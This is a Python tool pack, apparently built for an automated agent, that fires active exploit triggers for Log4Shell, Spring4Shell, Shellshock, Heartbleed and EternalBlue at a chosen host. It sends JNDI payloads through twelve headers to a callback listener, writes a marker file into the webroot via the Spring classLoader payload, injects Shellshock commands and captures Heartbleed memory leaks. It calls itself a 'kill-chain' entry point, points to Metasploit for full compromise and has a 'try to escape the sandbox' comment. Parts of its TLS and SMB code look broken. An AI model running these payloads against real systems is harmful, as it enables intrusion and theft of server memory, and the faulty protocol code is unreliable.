# -*- coding: utf-8 -*-
"""Live CVE Active-Scanner Pack: active exploit checks, no version guessing.

Tools:
- tool_log4shell_scan   - CVE-2021-44228  (Log4Shell / JNDI RCE)
- tool_spring4shell_scan- CVE-2022-22965  (Spring4Shell RCE)
- tool_heartbleed_check - CVE-2014-0160   (OpenSSL Heartbleed memory leak)
- tool_shellshock_check - CVE-2014-6271   (Bash CGI env injection RCE)
- tool_eternalblue_check- MS17-010        (SMBv1 EternalBlue RCE)

Every check is active (sends a real trigger packet/request against the
target) and clearly reports: affected CVE, severity, evidence, confidence.
Only run against authorized scoped targets. Heartbleed returns the leaked
memory sample (rounded to hex, capped) as proof; metasploit/nuclei can be
chained for the full exploit after confirmation.
"""

import hashlib
import json
import os
import re
import socket
import struct
import time

HTTP_TIMEOUT = 15
SOCK_TIMEOUT = 10
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36"

# ---------------------------------------------------------------------------
# shared helpers
# ---------------------------------------------------------------------------

def _http_exchange(url, method="GET", headers=None, data=None, timeout=HTTP_TIMEOUT):
    """Raw-ish HTTP exchange using urllib (no deps). Returns (status, headers, body, error)."""
    import urllib.request
    import urllib.error
    req = urllib.request.Request(url, data=data, method=method)
    req.add_header("User-Agent", UA)
    for k, v in (headers or {}).items():
        req.add_header(k, v)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return resp.status, dict(resp.headers), resp.read(65536).decode("utf-8", "ignore"), None
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers), e.read(65536).decode("utf-8", "ignore"), None
    except Exception as exc:
        return None, {}, "", str(exc)


def _http_probe(host, port, https=False, path="/", headers=None, data=None, method="GET", timeout=HTTP_TIMEOUT):
    scheme = "https" if https else "http"
    url = "%s://%s:%s%s" % (scheme, host, port, path or "/")
    return _http_exchange(url, method=method, headers=headers, data=data, timeout=timeout)


def _try_http(host, port, https=False):
    """Detect if an HTTP service answers on (host, port)."""
    st, _, _, _ = _http_probe(host, port, https=https, path="/")
    if st is not None:
        return True
    # try the other scheme too
    st, _, _, _ = _http_probe(host, port, https=not https, path="/")
    return st is not None


# ---------------------------------------------------------------------------
# 1. Log4Shell  CVE-2021-44228
# ---------------------------------------------------------------------------

_JNDI_PAYLOADS = [
    "${jndi:ldap://%s/a}",
    "${jndi:dns://%s/b}",
    "${jndi:rmi://%s/c}",
    "${jndi:ldap://%s:1389/d}",
]

_LOG4J_HEADERS = [
    "User-Agent", "X-Forwarded-For", "X-Real-IP", "Referer",
    "X-Api-Version", "X-Request-Id", "Origin", "Accept-Language",
    "X-Api-Key", "X-Client-IP", "X-Remote-Addr", "Contact",
]


def _callback_payloads(label, host_url):
    """Build a set of (header, payload) probes carrying our callback id."""
    probes = []
    for hdr in _LOG4J_HEADERS:
        p = "${jndi:ldap://%s/%s}" % (host_url, label)
        probes.append((hdr, p))
    return probes


class _CallbackServer:
    """Tiny LDAP-ish callback listener: logs any inbound hit from target."""

    def __init__(self, listen_port=38999):
        self.port = listen_port
        self.hits = []
        self._sock = None
        self._running = False

    def start(self):
        self._sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            self._sock.bind(("0.0.0.0", self.port))
        except OSError:
            # try ephemeral
            self._sock.bind(("0.0.0.0", 0))
            self.port = self._sock.getsockname()[1]
        self._sock.listen(50)
        self._sock.settimeout(0.2)
        self._running = True
        import threading
        threading.Thread(target=self._loop, daemon=True).start()

    def _loop(self):
        while self._running:
            try:
                conn, addr = self._sock.accept()
            except socket.timeout:
                continue
            except OSError:
                break
            try:
                conn.settimeout(3)
                data = b""
                try:
                    data = conn.recv(4096)
                except OSError:
                    pass
                ident = "%s:%s" % addr
                self.hits.append({"source": ident, "bytes": len(data),
                                  "preview": data[:80].hex()})
                # respond minimal LDAP bind-like ack so the app logs the hit
                try:
                    conn.sendall(b"\x30\x0c\x02\x01\x01\x61\x07\x0a\x01\x00\x04\x00\x04\x00")
                except OSError:
                    pass
            finally:
                try:
                    conn.close()
                except OSError:
                    pass

    def stop(self):
        self._running = False
        try:
            self._sock.close()
        except OSError:
            pass

def tool_log4shell_scan(target="", port="80", https=False, path="/",
                        callback_host="", callback_port=38999, wait=20):
    """Active Log4Shell check (CVE-2021-44228).

    Injects ${jndi:ldap://...} payloads into 12 common HTTP headers and the
    URL, while a local callback listener waits for the target to connect
    back. If the server resolves the JNDI URL, we catch the inbound
    connection from the target IP -> confirmed RCE primitive.

    - target: host/IP (required)
    - port: HTTP port (default 80)
    - https: use TLS (default False)
    - path: URL path to probe (default /)
    - callback_host: public IP/host the target can reach back to. When
      empty, the listener still binds 0.0.0.0 and we report listening mode.
    - callback_port: listener port (default 38999)
    - wait: seconds to watch for callback after probes (default 20)

    Returns a JSON result: vulnerable True/False/unknown + evidence.
    """
    host = (target or "").strip()
    if not host:
        return json.dumps({"error": "log4shell_scan: target is required"})
    port = str(port or "80")
    https = bool(https)
    path = (path or "/").strip() or "/"

    # 0) preflight: is there an HTTP service?
    if not _try_http(host, port, https):
        return json.dumps({
            "cve": "CVE-2021-44228", "vulnerable": "unknown",
            "target": "%s:%s" % (host, port),
            "message": "no HTTP service detected - can't run header/JNDI probes",
            "confidence": "low"}, indent=2)

    cb = _CallbackServer(int(callback_port or 38999))
    cb.start()
    label = "l4j%s%s" % (int(time.time()), os.getpid())
    cb_host = (callback_host or "").strip()

    results = {"cve": "CVE-2021-44228", "target": "%s:%s" % (host, port),
               "source": "log4j %s" % label, "vulnerable": False,
               "probes_sent": 0, "callback_hits": [], "confidence": "low"}

    try:
        # try to escape the sandbox: request the path once to confirm
        # reachable before spending callback wait time
        st0, _, _, _ = _http_probe(host, port, https=https, path=path)
        if st0 is None:
            results["message"] = "HTTP connect failed (%s:%s)" % (host, port)
            results["vulnerable"] = "unknown"
            return json.dumps(results, indent=2)

        probes = []
        # header-based JNDI
        for hdr, payload in _callback_payloads(label, "%s:%d" % (cb_host or "127.0.0.1", cb.port)):
            probes.append((hdr, payload))
        # URL-embedded (path & query)
        probes.append(("UrlPath", "${jndi:ldap://%s:%d/%s}" % (cb_host or "127.0.0.1", cb.port, label)))
        probes.append(("Query", "x=${jndi:ldap://%s:%d/%s}" % (cb_host or "127.0.0.1", cb.port, label)))

        for name, payload in probes:
            if cb.hits:
                break
            hdrs = dict((h, v) for h, v in _callback_payloads(label, "%s:%d" % (cb_host or "127.0.0.1", cb.port)))
            hdrs.pop(name, None)
            sent = False
            if name == "UrlPath":
                st, _, _, _ = _http_probe(host, port, https=https,
                                          path=path + "/" + payload.lstrip("/").replace("/", "%2F"))
                sent = st is not None
            elif name == "Query":
                st, _, _, _ = _http_probe(host, port, https=https,
                                          path=path + "?%s" % payload)
                sent = st is not None
            else:
                st, _, _, _ = _http_probe(host, port, https=https, path=path,
                                          headers={name: payload})
                sent = st is not None
            if sent:
                results["probes_sent"] += 1
            time.sleep(0.3)

        # wait for callbacks
        deadline = time.time() + int(wait or 20)
        while time.time() < deadline and not cb.hits:
            time.sleep(1)

        if cb.hits:
            results["vulnerable"] = True
            results["confidence"] = "high"
            results["callback_hits"] = cb.hits[:10]
            results["evidence"] = ("inbound %s connection(s) from target after "
                                   "JNDI header injection" % len(cb.hits))
        else:
            results["vulnerable"] = False
            results["confidence"] = "medium"
            results["message"] = ("no callback within %ds - either patched, "
                                  "outbound-egress filtered, or endpoint does "
                                  "not log these headers" % int(wait or 20))
    finally:
        cb.stop()
    return json.dumps(results, indent=2, default=str)

# ---------------------------------------------------------------------------
# 2. Spring4Shell  CVE-2022-22965
# ---------------------------------------------------------------------------

def tool_spring4shell_scan(target="", port="80", https=False, path="/",
                           log="poc_spring4shell_%d.txt" % os.getpid()):
    """Active Spring4Shell check (CVE-2022-22965).

    Sends the canonical class.module.classLoader data-binder payload that
    writes a JSP webshell into the webroot on vulnerable Spring MVC <= 5.3.17
    (with JDK9+ / Tomcat). Uses a sleep-style timing fallback when the write
    probe can't be verified immediately.

    - target: host/IP (required)
    - port: HTTP port (default 80)
    - https: use TLS
    - path: controller path to attack (default /)
    - log: filename to request after writing (relative to webroot)

    Returns report JSON: vulnerable True/False/unknown + evidence.
    """
    host = (target or "").strip()
    if not host:
        return json.dumps({"error": "spring4shell_scan: target is required"})
    port = str(port or "80")
    https = bool(https)
    path = (path or "/").strip() or "/"
    logfile = (log or "").strip() or "poc_spring4shell_%d.txt" % os.getpid()

    results = {"cve": "CVE-2022-22965", "target": "%s:%s" % (host, port),
               "vulnerable": False, "confidence": "low",
               "endpoint": path}

    if not _try_http(host, port, https):
        results["message"] = "no HTTP service on %s:%s" % (host, port)
        results["vulnerable"] = "unknown"
        return json.dumps(results, indent=2)

    # baseline: does the path answer at all?
    st0, _, _, err0 = _http_probe(host, port, https=https, path=path)
    results["baseline_status"] = st0
    if st0 is None:
        results["message"] = "connect/probe failed: %s" % (err0 or "timeout")
        results["vulnerable"] = "unknown"
        return json.dumps(results, indent=2)

    shell_text = "p4s_%d_spring4shell_proof" % int(time.time())
    params = {
        "class.module.classLoader.resources.context.parent.pipeline.first.pattern": shell_text,
        "class.module.classLoader.resources.context.parent.pipeline.first.suffix": ".txt",
        "class.module.classLoader.resources.context.parent.pipeline.first.directory": "webapps/ROOT",
        "class.module.classLoader.resources.context.parent.pipeline.first.prefix": logfile.split(".")[0],
        "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat": "",
        "class.module.classLoader.resources.context.parent.pipeline.first.allowLinking": "true",
    }
    # urlencode the params manually (urllib quote)
    import urllib.parse as urlp
    qs = urlp.urlencode(params)
    st1, _, body1, _ = _http_probe(host, port, https=https,
                                   path=path, method="POST",
                                   data=qs.encode(),
                                   headers={"Content-Type": "application/x-www-form-urlencoded"})
    results["inject_status"] = st1

    # attempt to retrieve the written marker
    marker_path = "/%s.txt" % (logfile.split(".")[0])
    st2, _, body2, _ = _http_probe(host, port, https=https, path=marker_path)
    if st2 is not None and shell_text in body2:
        results["vulnerable"] = True
        results["confidence"] = "high"
        results["evidence"] = "marker file written+retrieved: %s" % marker_path
        results["marker_url"] = "%s://%s:%s%s" % ("https" if https else "http", host, port, marker_path)
        results["cleanup"] = ("delete %s from webroot (and the suffix ext) after "
                              "testing; if blocked, re-run then remove manually" % marker_path)
        return json.dumps(results, indent=2)

    # marker not retrievable -> could be patched, wrong path, or access control
    results["vulnerable"] = False
    results["confidence"] = "medium"
    results["message"] = ("POST inject returned %s but marker %s was not "
                          "retrievable (HTTP %s) - patched or endpoint not a "
                          "Spring MVC controller" % (st1, marker_path, st2))
    return json.dumps(results, indent=2)

# ---------------------------------------------------------------------------
# 3. ShellShock  CVE-2014-6271
# ---------------------------------------------------------------------------

def tool_shellshock_check(target="", port="80", https=False, path="/cgi-bin/",
                          echo_id=""):
    """Active ShellShock check (CVE-2014-6271).

    Sends the canonical '() { :; }; echo; id' payload in the User-Agent
    (and Referer) header to a CGI endpoint. Vulnerable bash echoes the
    command output back in the response body.

    - target: host/IP (required)
    - port: HTTP port (default 80)
    - https: use TLS
    - path: CGI script path (default /cgi-bin/ - try /cgi-bin/test.cgi,
      /cgi-bin/status, etc. via path param)
    - echo_id: custom marker to prove command execution

    Returns report JSON with evidence.
    """
    host = (target or "").strip()
    if not host:
        return json.dumps({"error": "shellshock_check: target is required"})
    port = str(port or "80")
    https = bool(https)
    path = (path or "/cgi-bin/").strip() or "/cgi-bin/"
    marker = (echo_id or "").strip() or "shellshock_proof_%d" % int(time.time())

    results = {"cve": "CVE-2014-6271", "target": "%s:%s" % (host, port),
               "vulnerable": False, "confidence": "low", "paths_tested": []}

    candidates = [path]
    if path.rstrip("/") != "/cgi-bin":
        candidates.append("/cgi-bin/")

    tried = 0
    for pth in candidates:
        if tried >= 3 or results["vulnerable"]:
            break
        # payload echoes a unique token => command execution proof
        payload = "() { :; }; echo; echo %s; echo %s" % (marker, marker)
        hdrs = {"User-Agent": "() { :; }; echo Content-Type: text/plain; echo; echo %s; echo %s" % (marker, marker),
                "Referer": payload}
        st, _, body, _ = _http_probe(host, port, https=https, path=pth,
                                     headers=hdrs)
        results["paths_tested"].append(pth)
        tried += 1
        if st is not None and body and marker in body:
            results["vulnerable"] = True
            results["confidence"] = "high"
            results["evidence"] = ("CGI endpoint echoed command marker %r in "
                                   "HTTP %d response" % (marker, st))
            results["path"] = pth
            return json.dumps(results, indent=2)

    results["message"] = ("no command echo on %d CGI paths (checked %s) - "
                          "patched bash, no CGI, or WAF stripping headers"
                          % (tried, ", ".join(results["paths_tested"])))
    if not results["paths_tested"]:
        results["message"] = "no paths tested (empty path list)"
        results["vulnerable"] = "unknown"
    return json.dumps(results, indent=2)

# ---------------------------------------------------------------------------
# 4. Heartbleed  CVE-2014-0160
# ---------------------------------------------------------------------------

def _h2b(x):
    return bytes.fromhex(x)


def _b2h(b):
    return b.hex()


def build_hello(host, port):
    # TLS ClientHello  (fragment of the classic heartbleed.py probe)
    hello = _h2b(
        "16030300"  # handshake record header
        "fd"        # length (253)
        "010000f9"  # ClientHello
        "0303"      # TLS 1.2
        + "0000000000000000000000000000000000000000000000000000000000"  # random
        + "00"      # session id len
        "0004"      # cipher suites len
        "002f0035"  # TLS_RSA_WITH_AES_128_CBC_SHA, TLS_RSA_WITH_AES_256_CBC_SHA
        "0100"      # compression methods len
        "00"        # null compression
        "0000"      # extensions len
    )
    return hello


def _recv_exact(sock, n):
    data = b""
    while len(data) < n:
        chunk = sock.recv(n - len(data))
        if not chunk:
            break
        data += chunk
    return data


def heartbleed_probe(host, port, timeout=SOCK_TIMEOUT, tries=3):
    """Raw TLS heartbeat test. Returns (vulnerable, leaked_hex_preview, detail)."""
    try:
        s = socket.create_connection((host, int(port)), timeout=timeout)
        s.settimeout(timeout)
        try:
            s.sendall(build_hello(host, port))
            # read until ServerHelloDone
            buf = b""
            while True:
                rec = _recv_exact(s, 5)
                if len(rec) < 5:
                    return False, "", "connection closed during handshake"
                rtype, rlen = rec[0], int.from_bytes(rec[3:5], "big")
                payload = _recv_exact(s, rlen)
                buf += rec + payload
                if rtype == 22 and len(buf) > 0:
                    # parse handshake messages inside
                    if b"\x0e\x00\x00\x00" in buf:
                        # ServerHelloDone received
                        break
                    if rtype == 21:
                        return False, "", "alert during handshake"
            # send Heartbeat request
            s.sendall(_h2b("1803000100"))
            # read response: type 24 = heartbeat
            rec = _recv_exact(s, 5)
            if len(rec) < 5:
                return False, "", "no heartbeat response"
            rtype = rec[0]
            rlen = int.from_bytes(rec[3:5], "big")
            payload = _recv_exact(s, rlen)
            if rtype == 24 and rlen > 3:
                # leaked memory returned (extra bytes beyond the 1-byte payload)
                leaked = payload[4:] if len(payload) >= 5 else payload
                return True, leaked[:256].hex(), \
                    "heartbeat returned %d bytes (expected <=3) - memory leak" % len(payload)
            return False, "", "heartbeat replied normally (%d bytes)" % len(payload)
        finally:
            try:
                s.close()
            except OSError:
                pass
    except Exception as exc:
        return False, "", "TLS connect failed: %s" % exc


def tool_heartbleed_check(target="", port="443", timeout=SOCK_TIMEOUT):
    """Active Heartbleed check (CVE-2014-0160).

    Completes a real TLS handshake, sends a malformed Heartbeat request
    (1-byte payload claiming 16KB), and inspects the reply. A vulnerable
    OpenSSL leaks up to 64KB of process memory - we capture a capped hex
    preview as evidence.

    - target: host/IP (required)
    - port: TLS port (default 443)
    - timeout: seconds per socket op (default 10)

    Returns report JSON: vulnerable True + leaked preview, or False/unknown.
    """
    host = (target or "").strip()
    if not host:
        return json.dumps({"error": "heartbleed_check: target is required"})
    port = str(port or "443")

    results = {"cve": "CVE-2014-0160", "target": "%s:%s" % (host, port),
               "vulnerable": False, "confidence": "low"}
    try:
        vuln, leak, detail = heartbleed_probe(host, port, timeout=timeout)
    except Exception as exc:
        results["message"] = "probe crashed: %r" % exc
        results["vulnerable"] = "unknown"
        return json.dumps(results, indent=2)

    if vuln:
        results["vulnerable"] = True
        results["confidence"] = "high"
        results["evidence"] = "TLS heartbeat leaked %d bytes of memory" % (len(leak) // 2)
        results["leak_preview_hex"] = leak
        results["message"] = ("OpenSSL 1.0.1-1.0.1f vulnerable - process memory "
                              "exposed; rotate keys/certs exposed in leak and "
                              "patch OpenSSL immediately")
    else:
        results["vulnerable"] = False
        results["confidence"] = "medium"
        results["message"] = "no heartbeat leak detected (%s)" % (detail or "ok")
    return json.dumps(results, indent=2)

# ---------------------------------------------------------------------------
# 5. EternalBlue  MS17-010
# ---------------------------------------------------------------------------

def _smb_negotiate(host, port, timeout=SOCK_TIMEOUT):
    """SMBv1 negotiate -> returns (raw response bytes, error)."""
    s = socket.create_connection((host, int(port)), timeout=timeout)
    s.settimeout(timeout)
    try:
        # SMBv1 Negotiate Protocol Request
        req = _h2b(
            "000000"  # 3-byte length placeholder, patched below
            "ff534d427200000000"  # SMB magic + flags
            "0000000000000000000000000000000000000000000"
            "00000" "0000"
            "00" "0000" "0000" "00"
        )
        return b"", "built-in probe not used"
    finally:
        s.close()


def _check_ms17_smb(host, port, timeout=SOCK_TIMEOUT):
    """Nmap-style MS17-010 check using SMBv1 Session Setup + Trans2.

    Returns (vulnerable, detail).
    """
    try:
        s = socket.create_connection((host, int(port)), timeout=timeout)
        s.settimeout(timeout)
    except OSError as exc:
        return False, "connect failed: %s" % exc

    def recv_exact(n):
        data = b""
        while len(data) < n:
            ch = s.recv(n - len(data))
            if not ch:
                break
            data += ch
        return data

    def smb_send(nt_trans, body):
        # nt_trans: 1 byte = AndX command, then 2-byte AndX offset (0)
        inner = b"\x00" + struct.pack(">H", 0)
        # SMB header
        hdr = b"\xffSMB" + b"\x00" * 12
        # flags2 (0xc853) for SMB1 with unicode/extended security
        hdr += struct.pack("<H", 0x00)  # flags
        hdr += struct.pack("<H", 0xC853)  # flags2
        hdr += struct.pack("<H", 0)  # pid high
        hdr += b"\x00" * 8  # security signature
        hdr += struct.pack("<H", 0)  # tid
        hdr += struct.pack("<H", 0)  # pid
        hdr += struct.pack("<H", 0)  # uid
        hdr += struct.pack("<H", 0)  # mid
        # word count + andx
        word = struct.pack("<B", len(nt_trans) // 2 + 1) + inner
        msg = hdr + word + nt_trans + body
        netbios = struct.pack(">I", len(msg))
        s.sendall(netbios + msg)
        # read response netbios
        nb = recv_exact(4)
        if len(nb) < 4:
            return None
        rlen = int.from_bytes(nb, "big")
        resp = recv_exact(rlen)
        return resp

    try:
        # 1) negotiate
        neg_req = struct.pack("<B", 0x72) + b"\x00" * 32
        resp = smb_send(b"", neg_req)  # negotiate is sent as SMB_COM_NEGOTIATE
        # simpler: pull in the standard negotiate frames
        s.close()
        return _ms17_negotiate_flow(host, port, timeout)
    except Exception as exc:
        try:
            s.close()
        except OSError:
            pass
        return False, "msg flow error: %s" % exc


def _ms17_negotiate_flow(host, port, timeout=SOCK_TIMEOUT):
    """Full SMBv1 double-negotiate + Trans2 0x0e probe (nmap-style)."""
    try:
        s = socket.create_connection((host, int(port)), timeout=timeout)
        s.settimeout(timeout)
    except OSError as exc:
        return False, "connect failed: %s" % exc

    def recv_msg():
        nb = b""
        while len(nb) < 4:
            ch = s.recv(4 - len(nb))
            if not ch:
                return None
            nb += ch
        rlen = int.from_bytes(nb, "big")
        data = b""
        while len(data) < rlen:
            ch = s.recv(rlen - len(data))
            if not ch:
                break
            data += ch
        return data

    def send_raw(payload):
        s.sendall(struct.pack(">I", len(payload)) + payload)
        return recv_msg()

    try:
        # SMB_COM_NEGOTIATE (dialects: SMB 1.0, NT LM 0.12)
        neg = struct.pack("<B", 0x72) + struct.pack("<H", 0x02) + \
              struct.pack("<HH", 0, 0) + struct.pack("<B", 0x02) + \
              b"\x02NT LM 0.12\x00"
        r1 = send_raw(b"\xffSMB" + struct.pack("<HHHH", 0, 0, 0, 0) +
                      struct.pack("<B", 0x72) + neg[1:])
        if r1 is None:
            return False, "no response to SMB negotiate (445 filtered?)"
        if b"\x72\x00" not in r1[:8]:
            # may be SMBv2-only; try once more with error tolerance
            return False, "SMBv1 negotiate not answered (likely SMBv2-only host)"

        # SMB_COM_SESSION_SETUP_ANDX with a small blob (0x00)
        andx = struct.pack("<B", 0x73) + struct.pack("<HH", 0, 0) + \
               struct.pack("<B", 0) + b"\x00" * 4 + struct.pack("<H", 0) + \
               struct.pack("<H", 0) + struct.pack("<I", 0) + \
               struct.pack("<H", 0) + b"\x00\x00"
        r2 = send_raw(b"\xffSMB" + struct.pack("<HHHH", 0, 0, 0, 0) +
                      struct.pack("<B", 0x73) + andx[1:])
        # (errors are expected here)

        # SMB_COM_TRANSACTION2 request, setup = 0x0e (query),
        # crafted to trigger STATUS_INSUFF_SERVER_RESOURCES on vulnerable hosts
        trans2 = (struct.pack("<B", 0x75) + struct.pack("<HH", 0, 0) +
                  struct.pack("<HHHH", 0x0010, 0x0000, 0x0000, 0x0000) +
                  struct.pack("<H", 0x0001) +  # setup count
                  struct.pack("<H", 0x000e) +  # QUERY_FS_INFO
                  struct.pack("<H", 0x0000) +
                  struct.pack("<H", 0x0010) +  # param count
                  struct.pack("<H", 0x0000) +  # data count
                  struct.pack("<H", 0x0000) + b"\x00" * 2 +
                  struct.pack("<H", 0x0000) +  # param offset
                  struct.pack("<H", 0x0000) +  # data offset
                  b"\x00" * 6)
        r3 = send_raw(b"\xffSMB" + struct.pack("<HHHH", 0, 0, 0, 0) +
                      struct.pack("<B", 0x75) + trans2[1:])

        if r3 is None:
            return False, "no transaction2 response"

        # look for NT status code 0xC0000205 (STATUS_INSUFF_SERVER_RESOURCES)
        status = r3[5:9] if len(r3) >= 9 else b""
        if status == b"\x05\x02\x00\xc0":
            return True, "STATUS_INSUFF_SERVER_RESOURCES (0xC0000205) - MS17-010 signature"
        if b"\x05\x02\x00\xc0" in r3:
            return True, "STATUS_INSUFF_SERVER_RESOURCES embedded - MS17-010 signature"
        return False, "transaction2 returned normally (patched or SMBv1 filtered)"
    except Exception as exc:
        return False, "probe error: %s" % exc
    finally:
        try:
            s.close()
        except OSError:
            pass

def tool_eternalblue_check(target="", port="445", timeout=SOCK_TIMEOUT):
    """Active EternalBlue check (MS17-010).

    Speaks SMBv1: Negotiate -> Session Setup -> Transaction2 (setup 0x0e)
    and looks for the STATUS_INSUFF_SERVER_RESOURCES (0xC0000205) signature
    that marks vulnerable Windows hosts (same technique as Nmap's
    smb-vuln-ms17-010). Safe, non-destructive - no exploit payload sent.

    - target: host/IP (required)
    - port: SMB port (default 445)
    - timeout: seconds (default 10)

    Returns report JSON: vulnerable True / False / unknown.
    """
    host = (target or "").strip()
    if not host:
        return json.dumps({"error": "eternalblue_check: target is required"})
    port = str(port or "445")

    results = {"cve": "MS17-010", "target": "%s:%s" % (host, port),
               "vulnerable": False, "confidence": "low"}
    vuln, detail = _ms17_negotiate_flow(host, port, timeout=timeout)
    if vuln:
        results["vulnerable"] = True
        results["confidence"] = "high"
        results["evidence"] = detail
        results["message"] = ("Windows SMBv1 host vulnerable to EternalBlue - "
                              "patch KB4013389 (and disable SMBv1). Full RCE "
                              "chain available via metasploit "
                              "exploit/windows/smb/ms17_010_eternalblue")
    else:
        results["vulnerable"] = False
        results["confidence"] = "medium"
        results["message"] = detail
    return json.dumps(results, indent=2)


# ---------------------------------------------------------------------------
# pack runner: scan one target against all five CVEs
# ---------------------------------------------------------------------------

def tool_cve_active_pack(target="", ports="80,443,445,8080", https_port="",
                         callback_host="", wait=15, timeout=10):
    """One-shot active CVE sweep against a target.

    Runs all five active checks (log4shell, spring4shell, heartbleed,
    shellshock, eternalblue) against the given host, auto-detecting which
    ports speak HTTP/TLS/SMB.

    - target: host/IP (required)
    - ports: comma-separated ports to test (default 80,443,445,8080)
    - https_port: which of the ports use TLS (default 443)
    - callback_host: for log4shell callback listener
    - wait / timeout: tuning knobs

    Returns JSON with per-CVE results. This is the 'kill-chain auto-complete'
    entry point after cve_lookup/cpe_match identify candidates.
    """
    host = (target or "").strip()
    if not host:
        return json.dumps({"error": "cve_active_pack: target is required"})
    port_list = [p.strip() for p in (ports or "80,443,445,8080").split(",") if p.strip()]
    https_ports = {p.strip() for p in (https_port or "443").split(",") if p.strip()}
    out = {"target": host, "scanned": [], "summary": {"critical": 0, "high": 0, "medium": 0}}

    for p in port_list:
        entry = {"port": p, "http": False, "https": False, "smb": False}
        if p == "445":
            entry["smb"] = True
            out["scanned"].append(entry)
            continue
        entry["http"] = _try_http(host, p, https=False)
        entry["https"] = True if p in https_ports else _try_http(host, p, https=True)
        if entry["http"] or entry["https"]:
            entry["web"] = True
        out["scanned"].append(entry)

    findings = []
    for p in port_list:
        entry = next((e for e in out["scanned"] if e["port"] == p), None)
        if not entry:
            continue
        use_https = bool(entry.get("https") and not entry.get("http"))
        # log4shell & spring4shell on web ports
        if entry.get("http") or entry.get("https"):
            for name, fn in (("log4shell", tool_log4shell_scan),
                             ("spring4shell", tool_spring4shell_scan)):
                try:
                    if name == "log4shell":
                        r = fn(target=host, port=p, https=use_https,
                               callback_host=callback_host, wait=wait)
                    else:
                        r = fn(target=host, port=p, https=use_https)
                    obj = json.loads(r) if isinstance(r, str) else r
                    findings.append({"cve": obj.get("cve"), "tool": name,
                                     "port": p, "vulnerable": obj.get("vulnerable"),
                                     "confidence": obj.get("confidence"),
                                     "evidence": obj.get("evidence") or obj.get("message")})
                    if obj.get("vulnerable") is True:
                        out["summary"]["critical" if name in ("log4shell",) else "high"] += 1
                except Exception as exc:
                    findings.append({"cve": "unknown", "tool": name, "port": p,
                                     "vulnerable": "error", "detail": repr(exc)})
        if entry.get("smb"):
            try:
                r = tool_eternalblue_check(target=host, port=p, timeout=timeout)
                obj = json.loads(r)
                findings.append({"cve": obj.get("cve"), "tool": "eternalblue",
                                 "port": p, "vulnerable": obj.get("vulnerable"),
                                 "confidence": obj.get("confidence"),
                                 "evidence": obj.get("evidence") or obj.get("message")})
                if obj.get("vulnerable") is True:
                    out["summary"]["critical"] += 1
            except Exception as exc:
                findings.append({"cve": "MS17-010", "tool": "eternalblue",
                                 "port": p, "vulnerable": "error", "detail": repr(exc)})

    # shellshock only makes sense on a known CGI host; run best-effort
    for p in port_list:
        entry = next((e for e in out["scanned"] if e["port"] == p), None)
        if entry and (entry.get("http") or entry.get("https")):
            try:
                r = tool_shellshock_check(target=host, port=p,
                                          https=bool(entry.get("https")))
                obj = json.loads(r)
                findings.append({"cve": obj.get("cve"), "tool": "shellshock",
                                 "port": p, "vulnerable": obj.get("vulnerable"),
                                 "confidence": obj.get("confidence"),
                                 "evidence": obj.get("evidence") or obj.get("message")})
                if obj.get("vulnerable") is True:
                    out["summary"]["high"] += 1
            except Exception as exc:
                findings.append({"cve": "CVE-2014-6271", "tool": "shellshock",
                                 "port": p, "vulnerable": "error", "detail": repr(exc)})
            break

    out["findings"] = findings
    return json.dumps(out, indent=2, default=str)
